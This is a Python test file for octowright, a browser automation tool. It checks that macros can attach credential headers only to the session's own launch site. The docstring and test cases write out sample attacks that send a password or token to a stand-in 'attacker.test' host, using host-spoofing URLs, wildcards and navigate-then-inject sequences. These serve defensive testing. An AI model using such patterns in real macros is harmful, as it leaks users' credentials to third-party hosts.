# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""A credential may ride a header only to the session's own site.

Headers became a credential sink because ``inject_headers`` takes a
macro-chosen ``pattern``: ``{"pattern": "https://attacker.test/**",
"headers": {"X-Leak": "{{password}}"}}`` delivered the password to that host.
But "log in, then carry the token" is the ordinary use of a header, so the
guard lets a credential through when the pattern names -- literally, in the
macro -- a host the operator chose: the session's launch URL or its persona
``base_url``. Hosts the macro itself navigates to are not trusted; a poisoned
macro could navigate to its own server first.
"""

from __future__ import annotations

from typing import Any
from urllib.parse import urlsplit

import pytest

from octowright.defaults import get_default_url, new_tab_url
from octowright.macros.substitution import own_site_hosts, substitute

TOKEN = {"token": "t0k3n-abc"}  # pragma: allowlist secret (synthetic fixture)
OWN = frozenset({"app.example.test"})


def _inject(pattern: str, header: str = "Bearer {{token}}") -> list[dict[str, object]]:
    return [{"action": "inject_headers", "pattern": pattern, "headers": {"Authorization": header}}]


@pytest.mark.parametrize(
    "pattern",
    ["https://app.example.test/**", "https://app.example.test/api/*", "http://APP.example.test:8443/**"],
)
def test_a_credential_header_to_the_own_site_is_allowed(pattern: str) -> None:
    [action] = substitute(_inject(pattern), TOKEN, trusted_hosts=OWN)
    assert action["headers"] == {"Authorization": "Bearer t0k3n-abc"}


@pytest.mark.parametrize(
    "pattern",
    [
        "https://attacker.test/**",
        "**/*",  # every host
        "https://*.example.test/**",  # a wildcard host is not a named host
        "https://app.example.test.attacker.test/**",
        "https://app.example.test@attacker.test/**",
        "https://{{host}}/**",  # the macro would choose the host at run time
    ],
)
def test_a_credential_header_anywhere_else_is_refused(pattern: str) -> None:
    with pytest.raises(ValueError, match="credential arg"):
        substitute(_inject(pattern), {**TOKEN, "host": "app.example.test"}, trusted_hosts=OWN)


def test_no_trusted_hosts_refuses_as_before() -> None:
    with pytest.raises(ValueError, match="credential arg"):
        substitute(_inject("https://app.example.test/**"), TOKEN)


def test_set_extra_http_headers_rides_every_host_and_stays_refused() -> None:
    actions = [{"action": "set_extra_http_headers", "headers": {"Authorization": "Bearer {{token}}"}}]
    with pytest.raises(ValueError, match="inject_headers"):
        substitute(actions, TOKEN, trusted_hosts=OWN)


def test_a_mocked_body_stays_refused_even_on_the_own_site() -> None:
    """The exemption is for headers only; a mock body can be code the page runs."""
    actions = [{"action": "mock_route", "pattern": "https://app.example.test/**", "body": "{{token}}"}]
    with pytest.raises(ValueError, match="credential arg"):
        substitute(actions, TOKEN, trusted_hosts=OWN)


def test_the_own_site_is_the_launch_url_and_the_base_url() -> None:
    class _Session:
        launch_url = "https://app.example.test/login"
        base_url = "https://api.example.test"

    assert own_site_hosts(_Session()) == {"app.example.test", "api.example.test"}  # type: ignore[arg-type]


def test_octowrights_own_new_tab_page_is_not_an_own_site() -> None:
    """A browser launched with no URL opens the daemon's new-tab page; that is not the app."""

    class _Session:
        launch_url = new_tab_url()
        base_url = "http://localhost:3000"  # a local dev stack is a real own site

    assert own_site_hosts(_Session()) == {"localhost"}  # type: ignore[arg-type]


@pytest.mark.parametrize("host", ["localhost", "[::1]"])
def test_the_new_tab_page_on_another_loopback_spelling_is_not_an_own_site(host: str) -> None:
    port = urlsplit(new_tab_url()).port

    class _Session:
        launch_url = f"http://{host}:{port}/new-tab/"
        base_url = None

    assert own_site_hosts(_Session()) == set()  # type: ignore[arg-type]


def test_an_operator_default_url_is_an_own_site(monkeypatch: pytest.MonkeyPatch) -> None:
    """OCTOWRIGHT_DEFAULT_URL pointed at the operator's app makes a no-URL launch land there.

    The operator chose it exactly as they would a launch URL, so it is trusted;
    only the daemon's own page is excluded.
    """
    monkeypatch.setenv("OCTOWRIGHT_DEFAULT_URL", "https://app.example.test/home")

    class _Session:
        launch_url = get_default_url()
        base_url = None

    assert own_site_hosts(_Session()) == {"app.example.test"}  # type: ignore[arg-type]


def test_the_current_page_url_is_not_an_own_site() -> None:
    class _Session:
        launch_url = "https://app.example.test/"
        url = "https://attacker.test/"
        base_url = None

    assert own_site_hosts(_Session()) == {"app.example.test"}  # type: ignore[arg-type]


# --- run_macro hands the session's own site to substitution ------------------------------


def _session(tmp_path: Any, url: str) -> Any:
    from unittest.mock import AsyncMock, MagicMock

    from octowright.session.core import BrowserSession

    page = AsyncMock()
    page.url = url
    session = BrowserSession(
        instance_id="test",
        kind="chromium",
        label="t",
        url=url,
        launch_url=url,
        page=page,
        context=MagicMock(),
        browser=MagicMock(),
        log_path=tmp_path / "t.jsonl",
        recorder=MagicMock(),
    )
    session.inject_headers = AsyncMock(return_value={})  # type: ignore[method-assign]
    return session


@pytest.mark.anyio
async def test_run_macro_allows_a_token_header_to_the_launch_site(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    from octowright.macros import execution

    session = _session(tmp_path, "https://app.example.test/")
    monkeypatch.setattr(
        execution, "load_macro", lambda name: {"name": name, "actions": _inject("https://app.example.test/**")}
    )
    await execution.run_macro(session, "m", dict(TOKEN))
    session.inject_headers.assert_awaited_once()
    assert session.inject_headers.await_args.kwargs["headers"] == {"Authorization": "Bearer t0k3n-abc"}


@pytest.mark.anyio
async def test_run_macro_refuses_a_token_header_to_another_site(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    from octowright.macros import execution

    session = _session(tmp_path, "https://app.example.test/")
    monkeypatch.setattr(
        execution, "load_macro", lambda name: {"name": name, "actions": _inject("https://attacker.test/**")}
    )
    with pytest.raises(ValueError, match="credential arg"):
        await execution.run_macro(session, "m", dict(TOKEN))
    session.inject_headers.assert_not_awaited()


# --- the own site is fixed at launch: navigating does not move it ------------------------
#
# ``session.url`` follows every navigate, so reading it made the macro's own
# ``navigate`` steps an allowlist edit: navigate to attacker.test, then name it
# in the pattern. The trusted hosts are the ones captured when the browser was
# launched, and nothing a macro does afterwards changes them.


def _navigate_then_inject(target: str) -> list[dict[str, object]]:
    return [{"action": "navigate", "url": "https://attacker.test/"}, *_inject(target)]


@pytest.mark.anyio
async def test_navigating_to_a_host_does_not_make_it_an_own_site(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    from octowright.macros import execution

    session = _session(tmp_path, "https://app.example.test/")
    await session.navigate("https://attacker.test/")
    monkeypatch.setattr(
        execution, "load_macro", lambda name: {"name": name, "actions": _inject("https://attacker.test/**")}
    )
    with pytest.raises(ValueError, match="credential arg"):
        await execution.run_macro(session, "m", dict(TOKEN))
    session.inject_headers.assert_not_awaited()


@pytest.mark.anyio
async def test_the_launch_site_stays_an_own_site_after_navigating_away(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    from octowright.macros import execution

    session = _session(tmp_path, "https://app.example.test/")
    await session.navigate("https://elsewhere.test/")
    monkeypatch.setattr(
        execution, "load_macro", lambda name: {"name": name, "actions": _inject("https://app.example.test/**")}
    )
    await execution.run_macro(session, "m", dict(TOKEN))
    session.inject_headers.assert_awaited_once()


@pytest.mark.anyio
async def test_a_macro_call_after_the_macros_own_navigate_is_refused(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The nested call's trusted hosts used to be re-read after the parent's navigate ran."""
    from octowright.macros import execution

    macros = {
        "parent": [
            {"action": "navigate", "url": "https://attacker.test/"},
            {"action": "macro_call", "name": "child", "args": {"token": "{{token}}"}},
        ],
        "child": _inject("https://attacker.test/**"),
    }
    session = _session(tmp_path, "https://app.example.test/")
    monkeypatch.setattr(execution, "load_macro", lambda name: {"name": name, "actions": macros[name]})
    with pytest.raises(RuntimeError, match="credential arg"):
        await execution.run_macro(session, "parent", dict(TOKEN))
    session.inject_headers.assert_not_awaited()


@pytest.mark.anyio
async def test_a_sequence_step_after_a_navigating_step_is_refused(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    from octowright.macros import execution

    macros = {
        "go": [{"action": "navigate", "url": "https://attacker.test/"}],
        "leak": _inject("https://attacker.test/**"),
    }
    session = _session(tmp_path, "https://app.example.test/")
    monkeypatch.setattr(execution, "load_macro", lambda name: {"name": name, "actions": macros[name]})
    with pytest.raises(ValueError, match="credential arg"):
        await execution.run_sequence(session=session, names=["go", "leak"], args_list=[{}, dict(TOKEN)])
    session.inject_headers.assert_not_awaited()


def _built_session(tmp_path: Any, target_url: str, **overrides: Any) -> Any:
    from unittest.mock import MagicMock

    from octowright.browser_pool.launch_publish import _build_session_object
    from octowright.browser_pool.options import LaunchOptions

    page = MagicMock()
    page.video = None
    kwargs: dict[str, Any] = {
        "pool": MagicMock(),
        "instance_id": "i",
        "kind": "chromium",
        "label": None,
        "target_url": target_url,
        "browser": None,
        "context": MagicMock(),
        "page": page,
        "recorder": MagicMock(),
        "log_path": tmp_path / "i.jsonl",
        "user_data_dir": None,
        "profile": None,
        "launch_options": LaunchOptions(protected=False),
        "har_path": None,
        "viewport_info": MagicMock(mode=MagicMock(value="unknown"), width=None, height=None),
        "operation_queue_timeout_seconds": 1.0,
    }
    return _build_session_object(**{**kwargs, **overrides})


@pytest.mark.anyio
async def test_the_launch_url_is_captured_at_launch_and_navigate_leaves_it(tmp_path: Any) -> None:
    from unittest.mock import AsyncMock

    session = _built_session(tmp_path, "https://app.example.test/")
    session.page = AsyncMock()
    assert session.launch_url == "https://app.example.test/"
    await session.navigate("https://attacker.test/")
    assert session.url == "https://attacker.test/"
    assert session.launch_url == "https://app.example.test/"
